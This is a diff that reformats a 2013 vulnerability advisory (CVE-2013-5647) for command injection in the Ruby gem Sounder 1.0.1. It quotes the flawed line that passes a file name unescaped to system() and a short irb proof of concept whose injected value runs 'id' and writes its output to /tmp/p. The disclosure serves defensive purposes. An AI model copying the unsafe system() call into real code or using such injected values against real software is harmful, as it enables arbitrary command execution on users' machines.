@@ -1,26 +1,32 @@
+
                                Advisory #: 101
-Title: Command Injection in Ruby Gem Sounder 1.0.1
-Author:Larry W. Cashdollar, @_larry0
-Date: 2013-08-10
-Download Site: https://rubygems.org/gems/sounder
-Vendor:Adam Zaninovich
-Vendor Notified: 2013-08-10
-Vendor Contact: adam.zaninovich@gmail.com
-Description: Sounder is a ruby gem API for Mac OSX's afplay command.
-Vulnerability:
-From lib/sounder/sound.rb: def play system %{/usr/bin/afplay "#{@file}" &} end
-CVE-2013-5647
-JSON:Export
-Exploit Code:
-   1. irb(main):098:0> @file = "\"id;/usr/bin/id>/tmp/p;\""
-   2. => "\"id;/usr/bin/id>/tmp/p;\""
-   3. irb(main):099:0>  system %{/bin/echo "#{@file}" }
-   4. id
-   5. sh: 1: : Permission denied
-   6. => false
-   7. irb(main):100:0>
-   8.  
-   9. larry@underfl0w:/tmp$ cat /tmp/p
-  10. uid=1000(larry) gid=600(staff) groups=600(user)
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisories/sounder-ruby-gem-cmd-inj.html
+
+   Title: Command Injection in Ruby Gem Sounder 1.0.1
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2013-08-10
+   Download Site: https://rubygems.org/gems/sounder
+   Vendor: Adam Zaninovich
+   Vendor Notified: 2013-08-10
+   Vendor Contact: adam.zaninovich@gmail.com
+   Description: Sounder is a ruby gem API for Mac OSX's afplay command.
+   Vulnerability:
+   From lib/sounder/sound.rb: def play system %{/usr/bin/afplay "#{@file}"
+   &} end
+   CVE-2013-5647
+   JSON: Export
+   Exploit Code:
+
+    1. irb(main):098:0> @file = "\"id;/usr/bin/id>/tmp/p;\""
+    2. => "\"id;/usr/bin/id>/tmp/p;\""
+    3. irb(main):099:0> system %{/bin/echo "#{@file}" }
+    4. id
+    5. sh: 1: : Permission denied
+    6. => false
+    7. irb(main):100:0>
+    8.
+    9. larry@underfl0w:/tmp$ cat /tmp/p
+   10. uid=1000(larry) gid=600(staff) groups=600(user)
+
+   Screen Shots:
+   Advisory:
+   http://www.vapid.dhs.org/advisories/sounder-ruby-gem-cmd-inj.html
